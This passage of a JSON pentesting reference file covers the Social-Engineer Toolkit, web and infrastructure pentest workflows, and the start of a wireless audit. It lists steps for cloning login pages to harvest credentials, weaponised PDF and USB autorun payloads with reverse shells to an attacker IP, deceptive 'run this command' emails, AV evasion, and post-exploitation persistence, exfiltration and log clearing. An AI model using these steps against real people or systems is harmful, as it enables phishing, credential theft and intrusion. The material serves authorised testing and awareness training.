          {
            "title": "Clone target site",
            "details": "Enter URL of site to clone (e.g., company login page).",
            "command": "# 2) Site Cloner\n# IP for POST back: [your-attacker-IP]\n# URL to clone: https://target-company.com/login"
          },
          {
            "title": "Start web server",
            "details": "SET automatically starts Apache on port 80 to serve cloned site.",
            "command": "# Web server started on 0.0.0.0:80"
          },
          {
            "title": "Deliver phishing link",
            "details": "Send victims link to your attacker IP via email or social media.",
            "command": "# Phishing email: http://your-attacker-IP/"
          },
          {
            "title": "Harvest credentials",
            "details": "Monitor SET console for captured username/password submissions.",
            "command": "# Credentials displayed in real-time as victims submit forms"
          },
          {
            "title": "Stop campaign",
            "details": "Ctrl+C to stop web server and save captured credentials.",
            "command": "^C"
          }
        ]
      },
      {
        "title": "Spear phishing with malicious attachment",
        "steps": [
          {
            "title": "Select spear phishing",
            "details": "Choose Spear-Phishing Attack Vectors from main menu.",
            "command": "# 1) Social-Engineering Attacks\n# 1) Spear-Phishing Attack Vectors\n# 2) Create a FileFormat Payload"
          },
          {
            "title": "Generate malicious file",
            "details": "Create weaponized PDF, Word, or Excel document.",
            "command": "# Select payload: 14) Adobe PDF Embedded EXE Social Engineering\n# Enter filename: quarterly_report.pdf"
          },
          {
            "title": "Configure payload",
            "details": "Set reverse connection handler details for callback.",
            "command": "# LHOST: your-attacker-IP\n# LPORT: 443"
          },
          {
            "title": "Setup listener",
            "details": "Start Metasploit handler to catch incoming connections.",
            "command": "# SET offers to start Metasploit listener automatically"
          },
          {
            "title": "Compose phishing email",
            "details": "Create convincing pretext and attach malicious file.",
            "command": "# Use mass mailer or single email template\n# Attach generated payload"
          },
          {
            "title": "Send and monitor",
            "details": "Deliver email and wait for victim to open attachment.",
            "command": "# Monitor Metasploit console for sessions"
          }
        ]
      },
      {
        "title": "Infectious media generation (USB drop)",
        "steps": [
          {
            "title": "Select infectious media",
            "details": "Choose Infectious Media Generator from main menu.",
            "command": "# 1) Social-Engineering Attacks\n# 3) Infectious Media Generator"
          },
          {
            "title": "Choose file format",
            "details": "Select exploit or payload delivery method.",
            "command": "# 1) File-Format Exploits\n# 2) Standard Metasploit Executable"
          },
          {
            "title": "Configure payload",
            "details": "Set reverse shell parameters for connection.",
            "command": "# Select: windows/meterpreter/reverse_tcp\n# LHOST: attacker-IP\n# LPORT: 4444"
          },
          {
            "title": "Generate autorun",
            "details": "Create autorun.inf for automatic execution on USB insertion.",
            "command": "# Generate in /root/.set/autorun/"
          },
          {
            "title": "Copy to USB drive",
            "details": "Write files to physical USB for drop attack.",
            "command": "# cp /root/.set/autorun/* /media/usb/"
          },
          {
            "title": "Deploy and monitor",
            "details": "Place USB in target location and monitor for connections.",
            "command": "# Social engineer victim to insert USB\n# Monitor Metasploit listener"
          }
        ]
      },
      {
        "title": "Powershell attack vector",
        "steps": [
          {
            "title": "Select Powershell attack",
            "details": "Use PowerShell for fileless payload delivery.",
            "command": "# 1) Social-Engineering Attacks\n# 9) PowerShell Attack Vectors\n# 1) PowerShell Alphanumeric Shellcode Injector"
          },
          {
            "title": "Generate Powershell payload",
            "details": "Create encoded PowerShell command for delivery.",
            "command": "# Select payload type\n# LHOST: attacker-IP\n# LPORT: 443"
          },
          {
            "title": "Delivery method",
            "details": "Copy PowerShell command for delivery via phishing or HTA.",
            "command": "# Payload saved to /root/.set/\n# Copy command for delivery"
          },
          {
            "title": "Social engineer execution",
            "details": "Trick victim into running PowerShell command.",
            "command": "# Email pretending to be IT: 'Run this command to fix your issue...'"
          },
          {
            "title": "Catch session",
            "details": "Monitor Metasploit listener for incoming connections.",
            "command": "# msfconsole handler catches reverse shell"
          }
        ]
      },
      {
        "title": "QR code attack vector",
        "steps": [
          {
            "title": "Select QR code generator",
            "details": "Create malicious QR codes for physical social engineering.",
            "command": "# 1) Social-Engineering Attacks\n# 8) QRCode Generator Attack Vector"
          },
          {
            "title": "Enter malicious URL",
            "details": "Point QR code to credential harvester or exploit page.",
            "command": "# Enter URL: http://attacker-IP/fake-login"
          },
          {
            "title": "Generate QR code",
            "details": "SET creates scannable QR code image.",
            "command": "# QR code saved to /root/.set/qr_code.png"
          },
          {
            "title": "Print and deploy",
            "details": "Print QR codes on flyers, stickers, or posters for physical deployment.",
            "command": "# Print QR code and place in target locations"
          },
          {
            "title": "Monitor for scans",
            "details": "Watch for victims scanning QR codes and accessing payload.",
            "command": "# Monitor web server logs and harvester"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Complete phishing campaign",
        "stages": [
          {
            "label": "Reconnaissance",
            "description": "Research target organization, identify employees, gather email addresses.",
            "command": "# OSINT: LinkedIn, company website, theHarvester"
          },
          {
            "label": "Infrastructure setup",
            "description": "Register domain, setup email server, prepare payload hosting.",
            "command": "# Register lookalike domain, configure SMTP, setup web hosting"
          },
          {
            "label": "Payload creation",
            "description": "Generate malicious attachment or credential harvester with SET.",
            "command": "setoolkit # Generate fileformat payload or clone login page"
          },
          {
            "label": "Pretext development",
            "description": "Craft convincing email pretext based on target research.",
            "command": "# Create email template: urgent IT alert, invoice, benefits update"
          },
          {
            "label": "Campaign execution",
            "description": "Send phishing emails to target list, monitor responses.",
            "command": "# SET mass mailer or external SMTP tool"
          },
          {
            "label": "Monitoring and response",
            "description": "Track opens, clicks, credential submissions, shell callbacks.",
            "command": "# Monitor SET console, Metasploit sessions, web logs"
          },
          {
            "label": "Cleanup and reporting",
            "description": "Shutdown infrastructure, document results, educate targets.",
            "command": "# Stop listeners, remove payloads, generate metrics report"
          }
        ]
      },
      {
        "name": "Multi-vector social engineering",
        "stages": [
          {
            "label": "Initial phishing",
            "description": "Credential harvesting campaign to collect usernames/passwords.",
            "command": "# SET credential harvester cloning login page"
          },
          {
            "label": "Verify credentials",
            "description": "Test collected credentials against target services.",
            "command": "# Manual testing or automated validation"
          },
          {
            "label": "Payload delivery via email",
            "description": "Send authenticated email with malicious attachment from compromised account.",
            "command": "# Use harvested credentials to send from legitimate account"
          },
          {
            "label": "Physical USB drop",
            "description": "Deploy infectious media in parking lot or reception.",
            "command": "# SET infectious media generator > create USB payloads"
          },
          {
            "label": "Exploit multiple vectors",
            "description": "Maximize chances of success with layered approach.",
            "command": "# Combine email, physical, and phone-based pretexting"
          }
        ]
      },
      {
        "name": "Awareness training campaign",
        "stages": [
          {
            "label": "Baseline assessment",
            "description": "Measure current employee susceptibility to phishing.",
            "command": "# Run simulated phishing campaign, track click rates"
          },
          {
            "label": "Targeted training",
            "description": "Educate employees who fell for simulation.",
            "command": "# Security awareness training for vulnerable users"
          },
          {
            "label": "Follow-up testing",
            "description": "Re-test with more sophisticated attacks.",
            "command": "# Spear phishing with personalized pretexts"
          },
          {
            "label": "Metrics and reporting",
            "description": "Track improvement over time, report to management.",
            "command": "# Generate metrics: click rate reduction, reporting rate increase"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] Credential Harvester is now listening...",
        "meaning": "Web server active, waiting for victims to submit credentials.",
        "severity": "info"
      },
      {
        "indicator": "[*] WE GOT A HIT! Printing the output:",
        "meaning": "Victim submitted credentials; check console for username/password.",
        "severity": "success"
      },
      {
        "indicator": "[*] Payload created: /root/.set/payload.exe",
        "meaning": "Malicious file generated successfully; ready for delivery.",
        "severity": "info"
      },
      {
        "indicator": "[!] Apache is not installed, would you like to install?",
        "meaning": "Web server dependency missing; install Apache2 for web attacks.",
        "severity": "warning"
      },
      {
        "indicator": "[*] Metasploit handler started",
        "meaning": "Listener active for payload callbacks; monitor for incoming shells.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom template development",
        "scenario": "Create branded phishing templates for specific organizations.",
        "command": "# Edit templates in /usr/share/set/src/templates/\n# Modify HTML/CSS to match target branding",
        "notes": [
          "Clone real company login pages for authenticity.",
          "Test rendering across browsers and email clients.",
          "Include logos, colors, and language matching target."
        ]
      },
      {
        "title": "Integration with external SMTP",
        "scenario": "Use external email service for better delivery rates.",
        "command": "# SET config.py: SENDMAIL = 'ON'\n# Configure SMTP relay in /etc/ssmtp/ssmtp.conf",
        "notes": [
          "Use compromised or lookalike domains for sender.",
          "Configure SPF, DKIM, DMARC to bypass spam filters.",
          "Warm up email sending IP before mass campaigns."
        ]
      },
      {
        "title": "Automation with SET command-line",
        "scenario": "Automate campaign deployment for large-scale testing.",
        "command": "# setoolkit --automated config.txt",
        "notes": [
          "Create config file with attack parameters.",
          "Schedule via cron for recurring awareness tests.",
          "Parse output for automated reporting."
        ]
      },
      {
        "title": "Payload obfuscation and evasion",
        "scenario": "Evade AV and email gateway detection.",
        "command": "# Use custom encoders, encryption, or packing\n# Veil-Evasion integration for advanced payloads",
        "notes": [
          "Combine SET with Veil-Evasion for better evasion.",
          "Test payloads against VirusTotal (with caution).",
          "Use macro-enabled documents for Microsoft Office targets."
        ]
      },
      {
        "title": "Tracking and analytics",
        "scenario": "Implement tracking pixels and link analytics for campaign metrics.",
        "command": "# Embed tracking images in emails\n# Use URL shorteners with analytics (bitly, custom)",
        "notes": [
          "Track email opens with 1x1 pixel images.",
          "Monitor link clicks with custom redirect scripts.",
          "Correlate metrics with user demographics for targeted training."
        ]
      }
    ],
    "comparison_table": {
      "title": "SET vs Other Phishing Frameworks",
      "headers": ["Feature", "SET", "Gophish", "King Phisher"],
      "rows": [
        ["Price", "Free & Open Source", "Free & Open Source", "Free & Open Source"],
        ["Ease of use", "Menu-driven CLI", "Web GUI", "GTK GUI"],
        ["Credential harvesting", "", "", ""],
        ["Payload generation", " Metasploit", "Limited", "Limited"],
        ["Email templates", "Basic", " Rich editor", " Jinja2"],
        ["Campaign tracking", "Basic", " Advanced", " Advanced"],
        ["Infectious media", "", "", ""],
        ["Best for", "Payload delivery", "Awareness training", "Red team ops"]
      ]
    },
    "resources": [
      {
        "label": "Official GitHub",
        "url": "https://github.com/trustedsec/social-engineer-toolkit",
        "description": "SET source code, issues, and documentation."
      },
      {
        "label": "TrustedSec Blog",
        "url": "https://www.trustedsec.com/blog/",
        "description": "Articles and tutorials on social engineering techniques."
      },
      {
        "label": "SET User Manual",
        "url": "https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/USER_MANUAL.md",
        "description": "Comprehensive user guide for all SET features."
      }
    ]
  },
  {
    "id": "hackrf",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "gqrx",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "gnuradio",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "urh",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "workflow_web_app_pentest",
    "name": "Web Application Pentesting Workflow",
    "summary": "Comprehensive methodology for web application security testing from reconnaissance to reporting, covering OWASP Top 10 vulnerabilities and modern attack techniques.",
    "details": "This workflow provides a systematic approach to web application penetration testing. It follows industry-standard methodologies including OWASP Testing Guide and PTES, ensuring thorough coverage of all attack vectors. The workflow is divided into distinct phases with clear decision points and evidence collection requirements.",
    "installation_guides": [
      {
        "platform": "Prerequisites",
        "summary": "Required tools and environment setup",
        "steps": [
          {
            "detail": "Install base reconnaissance tools: amass, sublist3r, theHarvester, dnsrecon",
            "copyable": false
          },
          {
            "detail": "Set up web scanning tools: nmap, nikto, gobuster, ffuf, nuclei",
            "copyable": false
          },
          {
            "detail": "Configure web proxies: burpsuite or owasp-zap",
            "copyable": false
          },
          {
            "detail": "Prepare exploitation tools: sqlmap, metasploit, searchsploit",
            "copyable": false
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick reconnaissance scan",
        "command": "amass enum -d example.com -o amass_results.txt",
        "notes": [
          "Start with passive reconnaissance to avoid detection"
        ]
      },
      {
        "description": "Web technology identification",
        "command": "whatweb --log-verbose=vuln_scan.txt https://target.example.com",
        "notes": [
          "Identifies technologies, frameworks, and potential vulnerabilities"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Reconnaissance & Information Gathering",
        "steps": [
          {
            "title": "Subdomain Enumeration",
            "details": "Discover all subdomains and attack surface using multiple tools",
            "command": "amass enum -d example.com -o amass_results.txt && sublist3r -d example.com -o sublist3r_results.txt"
          },
          {
            "title": "OSINT Gathering",
            "details": "Collect publicly available information about the target",
            "command": "theHarvester -d example.com -l 500 -b google,linkedin -h"
          },
          {
            "title": "DNS Reconnaissance",
            "details": "Map DNS infrastructure and identify potential entry points",
            "command": "dnsrecon -d example.com -t std -o dns_results.txt"
          },
          {
            "title": "Technology Identification",
            "details": "Identify web technologies, frameworks, and versions",
            "command": "whatweb --log-verbose=tech_ident.txt https://target.example.com"
          }
        ]
      },
      {
        "title": "Phase 2: Scanning & Enumeration",
        "steps": [
          {
            "title": "Port Scanning",
            "details": "Identify open ports and services on target infrastructure",
            "command": "nmap -sS -sV -oN nmap_scan.txt -p- target.example.com"
          },
          {
            "title": "Web Vulnerability Scanning",
            "details": "Automated scanning for common web vulnerabilities",
            "command": "nikto -h https://target.example.com -o nikko_results.txt"
          },
          {
            "title": "Directory Brute Forcing",
            "details": "Discover hidden directories and files",
            "command": "gobuster dir -u https://target.example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_results.txt"
          },
          {
            "title": "Nuclei Template Scanning",
            "details": "Template-based vulnerability scanning",
            "command": "nuclei -l targets.txt -o nuclei_results.txt"
          }
        ]
      },
      {
        "title": "Phase 3: Manual Testing & Vulnerability Analysis",
        "steps": [
          {
            "title": "Web Proxy Configuration",
            "details": "Set up Burp Suite or OWASP ZAP for intercepting traffic",
            "command": "# Configure browser proxy to 127.0.0.1:8080 for Burp Suite"
          },
          {
            "title": "SQL Injection Testing",
            "details": "Test for SQL injection vulnerabilities using sqlmap",
            "command": "sqlmap -u \"https://target.example.com/page?id=1\" --batch --sql-shell"
          },
          {
            "title": "XSS Testing",
            "details": "Test for reflected and stored XSS vulnerabilities",
            "command": "# Use Burp Suite scanner and manual testing with XSS payloads"
          },
          {
            "title": "Authentication Bypass",
            "details": "Test authentication mechanisms for bypasses",
            "command": "# Test default credentials, SQL injection in login forms, JWT manipulation"
          }
        ]
      },
      {
        "title": "Phase 4: Exploitation & Post-Exploitation",
        "steps": [
          {
            "title": "Exploit Research",
            "details": "Find exploits for identified vulnerabilities",
            "command": "searchsploit apache 2.4.49"
          },
          {
            "title": "Metasploit Exploitation",
            "details": "Use Metasploit framework for exploitation",
            "command": "msfconsole -x \"use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS target.example.com; exploit\""
          },
          {
            "title": "Shell Stabilization",
            "details": "Upgrade basic shell to fully interactive session",
            "command": "# Use pwncat or python -c 'import pty; pty.spawn(\"/bin/bash\")'"
          },
          {
            "title": "Privilege Escalation",
            "details": "Escalate privileges within the compromised system",
            "command": "linpeas.sh | tee linpeas_results.txt"
          }
        ]
      },
      {
        "title": "Phase 5: Reporting & Evidence Collection",
        "steps": [
          {
            "title": "Evidence Documentation",
            "details": "Collect and organize all evidence and screenshots",
            "command": "# Create evidence folder structure: mkdir -p evidence/{recon,scan,exploit,report}"
          },
          {
            "title": "Vulnerability Documentation",
            "details": "Document each finding with screenshots and proof",
            "command": "# Use Dradis or Faraday for collaborative reporting"
          },
          {
            "title": "Risk Assessment",
            "details": "Assess risk levels and business impact",
            "command": "# Use CVSS calculator for scoring vulnerabilities"
          },
          {
            "title": "Final Report Generation",
            "details": "Generate comprehensive penetration testing report",
            "command": "# Compile findings, recommendations, and remediation steps"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Complete Web Application Pentesting Timeline",
        "stages": [
          {
            "label": "Day 1: Reconnaissance",
            "description": "Passive and active reconnaissance, subdomain enumeration, technology identification",
            "command": "amass enum -d example.com -o amass_results.txt && sublist3r -d example.com -o sublist3r.txt"
          },
          {
            "label": "Day 2: Scanning",
            "description": "Port scanning, vulnerability scanning, directory enumeration",
            "command": "nmap -sS -sV -oN nmap_scan.txt target.example.com && nikto -h https://target.example.com -o nikko.txt"
          },
          {
            "label": "Day 3: Manual Testing",
            "description": "Configure web proxy, test for OWASP Top 10 vulnerabilities",
            "command": "# Start Burp Suite, configure browser proxy, begin manual testing"
          },
          {
            "label": "Day 4: Exploitation",
            "description": "Exploit validated vulnerabilities, establish persistence",
            "command": "msfconsole -r exploit.rc"
          },
          {
            "label": "Day 5: Reporting",
            "description": "Document findings, generate report, provide remediation",
            "command": "# Compile evidence, write executive summary, create technical report"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Subdomain discovered: admin.example.com",
        "meaning": "Administrative interface potentially exposed",
        "severity": "High"
      },
      {
        "indicator": "Port 80/443 open with Apache/2.4.49",
        "meaning": "Web server running vulnerable Apache version",
        "severity": "Critical"
      },
      {
        "indicator": "SQL injection vulnerability confirmed",
        "meaning": "Database can be accessed and potentially dumped",
        "severity": "Critical"
      },
      {
        "indicator": "Directory listing enabled",
        "meaning": "Sensitive files may be exposed",
        "severity": "Medium"
      },
      {
        "indicator": "Weak authentication mechanism",
        "meaning": "Accounts can be bypassed or brute-forced",
        "severity": "High"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Nuclei Templates",
        "scenario": "Create custom templates for target-specific vulnerabilities",
        "command": "nuclei -t custom-templates/ -l targets.txt -o custom_results.txt",
        "notes": [
          "Write YAML templates for application-specific vulnerabilities"
        ]
      },
      {
        "title": "Burp Suite Intruder Automation",
        "scenario": "Automate parameter fuzzing with custom payloads",
        "command": "# Use Intruder with custom wordlists and payload markers",
        "notes": [
          "Create targeted payload lists for specific parameter types"
        ]
      },
      {
        "title": "Metasploit Resource Scripts",
        "scenario": "Automate exploitation chain with resource scripts",
        "command": "msfconsole -r automated_exploit.rc",
        "notes": [
          "Resource scripts can chain multiple exploits automatically"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Web Application Testing Methodologies Comparison",
      "columns": ["Aspect", "OWASP Testing Guide", "PTES", "NIST SP 800-115", "OSSTMM"],
      "rows": [
        ["Scope", "Web apps & APIs", "All pentesting", "Technical testing", "Security testing"],
        ["Structure", "Phase-based", "Phase-based", "Step-by-step", "Scope-based"],
        ["Coverage", "OWASP Top 10 focus", "Comprehensive", "Technical depth", "Operational security"],
        ["Documentation", "Detailed guides", "Framework", "Formal standard", "Methodology"],
        ["Best for", "Web app testing", "General pentesting", "Compliance", "Comprehensive audits"]
      ]
    },
    "resources": [
      {
        "label": "OWASP Testing Guide",
        "url": "https://owasp.org/www-project-web-security-testing-guide/",
        "description": "Comprehensive web application testing methodology"
      },
      {
        "label": "PTES Framework",
        "url": "https://www.pentest-standard.org/",
        "description": "Penetration Testing Execution Standard"
      },
      {
        "label": "Burp Suite Documentation",
        "url": "https://portswigger.net/burp/documentation",
        "description": "Complete guide to Burp Suite features and techniques"
      }
    ]
  },
  {
    "id": "workflow_infra_pentest",
    "name": "Infrastructure Pentesting Workflow",
    "summary": "Systematic methodology for infrastructure penetration testing covering network reconnaissance, service enumeration, vulnerability assessment, and system compromise.",
    "details": "This workflow provides a structured approach to testing network infrastructure including servers, network devices, and cloud environments. It follows industry best practices for infrastructure security testing with emphasis on stealth, thoroughness, and proper evidence collection.",
    "installation_guides": [
      {
        "platform": "Prerequisites",
        "summary": "Required tools for infrastructure testing",
        "steps": [
          {
            "detail": "Install network scanning tools: nmap, masscan, naabu",
            "copyable": false
          },
          {
            "detail": "Set up enumeration tools: enum4linux, smbmap, snmpwalk",
            "copyable": false
          },
          {
            "detail": "Prepare exploitation framework: metasploit, searchsploit",
            "copyable": false
          },
          {
            "detail": "Configure post-exploitation tools: mimikatz, bloodhound-python",
            "copyable": false
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Fast port discovery",
        "command": "masscan -p1-65535 target.example.com --rate=1000 -o masscan.txt",
        "notes": [
          "Quick discovery of all open ports"
        ]
      },
      {
        "description": "Service enumeration",
        "command": "nmap -sV -sC -oA detailed_scan target.example.com",
        "notes": [
          "Detailed service version and script scanning"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Network Reconnaissance",
        "steps": [
          {
            "title": "Port Discovery",
            "details": "Identify all open ports using fast scanning techniques",
            "command": "masscan -p1-65535 target.example.com --rate=1000 -o masscan_results.txt"
          },
          {
            "title": "Service Version Detection",
            "details": "Identify running services and their versions",
            "command": "nmap -sV -oN service_versions.txt -p $(cat masscan_results.txt | grep -oP '\\d+ | tr '\\n' ',' | sed 's/,$//') target.example.com"
          },
          {
            "title": "OS Detection",
            "details": "Identify operating systems of target hosts",
            "command": "nmap -O -oN os_detection.txt target.example.com"
          },
          {
            "title": "Network Topology Mapping",
            "details": "Map network structure and relationships",
            "command": "nmap -sL -oN network_map.txt target.example.com/24"
          }
        ]
      },
      {
        "title": "Phase 2: Service Enumeration",
        "steps": [
          {
            "title": "SMB Enumeration",
            "details": "Enumerate SMB shares and permissions",
            "command": "enum4linux -a target.example.com > enum4linux_results.txt"
          },
          {
            "title": "SNMP Enumeration",
            "details": "Gather information via SNMP community strings",
            "command": "snmpwalk -c public -v1 target.example.com > snmpwalk_results.txt"
          },
          {
            "title": "SMTP Enumeration",
            "details": "Enumerate SMTP users and configuration",
            "command": "smtp-user-enum -M VRFY -U users.txt -t target.example.com"
          },
          {
            "title": "DNS Zone Transfer",
            "details": "Attempt DNS zone transfer for domain enumeration",
            "command": "dig axfr @ns1.example.com example.com > zone_transfer.txt"
          }
        ]
      },
      {
        "title": "Phase 3: Vulnerability Assessment",
        "steps": [
          {
            "title": "Nmap Script Scanning",
            "details": "Run comprehensive NSE scripts for vulnerability detection",
            "command": "nmap -sC --script vuln -oN vuln_scan.txt target.example.com"
          },
          {
            "title": "Nuclei Scanning",
            "details": "Template-based vulnerability scanning",
            "command": "nuclei -target target.example.com -o nuclei_results.txt"
          },
          {
            "title": "Service-Specific Testing",
            "details": "Test specific services for known vulnerabilities",
            "command": "# Test web servers, databases, and other services individually"
          },
          {
            "title": "Configuration Review",
            "details": "Review service configurations for security issues",
            "command": "# Analyze service banners, default credentials, misconfigurations"
          }
        ]
      },
      {
        "title": "Phase 4: Exploitation",
        "steps": [
          {
            "title": "Exploit Research",
            "details": "Research exploits for identified vulnerabilities",
            "command": "searchsploit service_name version_number"
          },
          {
            "title": "Metasploit Exploitation",
            "details": "Use Metasploit for automated exploitation",
            "command": "msfconsole -x \"use exploit/multi/samba/usermap_script; set RHOSTS target.example.com; exploit\""
          },
          {
            "title": "Manual Exploitation",
            "details": "Manually exploit vulnerabilities when automated tools fail",
            "command": "# Use custom payloads and manual techniques"
          },
          {
            "title": "Privilege Escalation",
            "details": "Escalate privileges on compromised systems",
            "command": "linpeas.sh | tee priv_esc_results.txt"
          }
        ]
      },
      {
        "title": "Phase 5: Post-Exploitation",
        "steps": [
          {
            "title": "Persistence Mechanisms",
            "details": "Establish persistent access to compromised systems",
            "command": "# Create backdoors, scheduled tasks, or services"
          },
          {
            "title": "Lateral Movement",
            "details": "Move laterally through the network",
            "command": "# Use stolen credentials, pass-the-hash, or other techniques"
          },
          {
            "title": "Data Exfiltration",
            "details": "Extract sensitive data from compromised systems",
            "command": "# Collect and exfiltrate valuable data"
          },
          {
            "title": "Covering Tracks",
            "details": "Clean up evidence of intrusion",
            "command": "# Clear logs, remove tools, hide backdoors"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Infrastructure Pentesting Timeline",
        "stages": [
          {
            "label": "Day 1: Network Mapping",
            "description": "Complete network reconnaissance and service identification",
            "command": "masscan -p1-65535 target.example.com --rate=1000 -o masscan.txt && nmap -sV -oN services.txt target.example.com"
          },
          {
            "label": "Day 2: Service Enumeration",
            "description": "Deep dive into discovered services and configurations",
            "command": "enum4linux -a target.example.com && snmpwalk -c public -v1 target.example.com"
          },
          {
            "label": "Day 3: Vulnerability Testing",
            "description": "Comprehensive vulnerability assessment and exploitation",
            "command": "nmap -sC --script vuln target.example.com && nuclei -target target.example.com"
          },
          {
            "label": "Day 4: System Compromise",
            "description": "Exploit vulnerabilities and establish access",
            "command": "msfconsole -r exploit.rc"
          },
          {
            "label": "Day 5: Post-Exploitation",
            "description": "Lateral movement, data collection, and persistence",
            "command": "# Establish persistence, move laterally, collect data"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Open SMB shares with write permissions",
        "meaning": "Potential for remote code execution and data exfiltration",
        "severity": "Critical"
      },
      {
        "indicator": "Default SNMP community string",
        "meaning": "Extensive network information disclosure",
        "severity": "High"
      },
      {
        "indicator": "Outdated service versions",
        "meaning": "Known vulnerabilities likely exploitable",
        "severity": "High"
      },
      {
        "indicator": "Weak authentication mechanisms",
        "meaning": "Brute force or credential stuffing possible",
        "severity": "Medium"
      },
      {
        "indicator": "Misconfigured network services",
        "meaning": "Potential for unauthorized access",
        "severity": "Medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Nmap Scripts",
        "scenario": "Create custom NSE scripts for target-specific testing",
        "command": "nmap --script custom.nse target.example.com",
        "notes": [
          "Write Lua scripts for custom vulnerability detection"
        ]
      },
      {
        "title": "Metasploit Automation",
        "scenario": "Automate large-scale exploitation with resource scripts",
        "command": "msfconsole -r automated_campaign.rc",
        "notes": [
          "Resource scripts can handle multiple targets automatically"
        ]
      },
      {
        "title": "Custom Exploit Development",
        "scenario": "Develop custom exploits for 0-day vulnerabilities",
        "command": "# Use Python, Metasploit, or custom C/C++ exploits",
        "notes": [
          "Custom exploits when public ones are not available"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Infrastructure Testing Approaches",
      "columns": ["Method", "Stealth", "Speed", "Coverage", "Detection Risk"],
      "rows": [
        ["Passive Recon", "Low", "Slow", "Limited", "Very Low"],
        ["Active Scanning", "Medium", "Fast", "Comprehensive", "High"],
        ["Manual Testing", "High", "Slow", "Targeted", "Medium"],
        ["Automated Exploitation", "Low", "Fast", "Broad", "Very High"]
      ]
    },
    "resources": [
      {
        "label": "Network Security Assessment",
        "url": "https://www.amazon.com/Network-Security-Assessment-Know-Your/dp/1449370163",
        "description": "Comprehensive guide to network security testing"
      },
      {
        "label": "Metasploit Unleashed",
        "url": "https://www.offensive-security.com/metasploit-unleashed/",
        "description": "Free Metasploit training course"
      }
    ]
  },
  {
    "id": "workflow_wireless_audit",
    "name": "Wireless Security Audit Workflow",
    "summary": "Complete methodology for wireless security testing covering WiFi networks, Bluetooth devices, and RF spectrum analysis.",
    "details": "This workflow provides a systematic approach to wireless security testing including WiFi network auditing, rogue access point detection, and RF spectrum analysis. It covers both infrastructure and client-side attacks with emphasis on stealth and proper evidence collection.",
    "installation_guides": [
      {
        "platform": "Wireless Adapter Setup",
        "summary": "Configure wireless adapter for monitor mode",
        "steps": [
          {
            "detail": "iwconfig # Identify wireless interface",
            "copyable": true
          },
          {
            "detail": "sudo airmon-ng start wlan0 # Enable monitor mode",
            "copyable": true
          },
          {
            "detail": "sudo iwconfig # Verify monitor mode is active",
            "copyable": true
          },
          {
            "detail": "airodump-ng wlan0mon # Test packet capture",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Required Tools",
        "summary": "Install wireless security testing tools",
        "steps": [
          {
            "detail": "sudo apt install -y aircrack-ng kismet wifite reaver bully",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y mdk4 wireshark tshark",
            "copyable": true
          },
          {
            "detail": "pip install scapy # For packet crafting",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick WiFi network discovery",
        "command": "airodump-ng wlan0mon --write scan_results",
        "notes": [
          "Discover all nearby WiFi networks"
        ]
      },
      {
        "description": "WPS PIN attack",
        "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv",
        "notes": [
          "Test WPS vulnerability for PIN recovery"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Wireless Network Discovery",
        "steps": [
          {
            "title": "Monitor Mode Setup",
            "details": "Configure wireless adapter for monitor mode",
            "command": "sudo airmon-ng start wlan0 && sudo iwconfig"
          },
          {
            "title": "Network Scanning",
            "details": "Discover all wireless networks in range",
            "command": "airodump-ng wlan0mon --write wireless_scan"
          },
          {
            "title": "Channel Analysis",
            "details": "Analyze channel usage and interference",
            "command": "airodump-ng wlan0mon --write channel_analysis -c 1-14"
          },
          {
            "title": "Signal Strength Mapping",
            "details": "Map signal strength and coverage areas",
            "command": "# Move around area while scanning to map coverage"
          }
        ]
      },
      {
        "title": "Phase 2: Target Analysis",
        "steps": [
          {
            "title": "Target Network Selection",
            "details": "Select target network for detailed analysis",
            "command": "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target wlan0mon"
          },
          {
            "title": "Client Identification",
            "details": "Identify connected clients and devices",
            "command": "# Monitor connected clients in airodump-ng output"
          },
          {
            "title": "Encryption Analysis",
            "details": "Analyze encryption type and security configuration",
            "command": "# Review WPA/WPA2/WPA3 and WPS configuration"
          },
          {
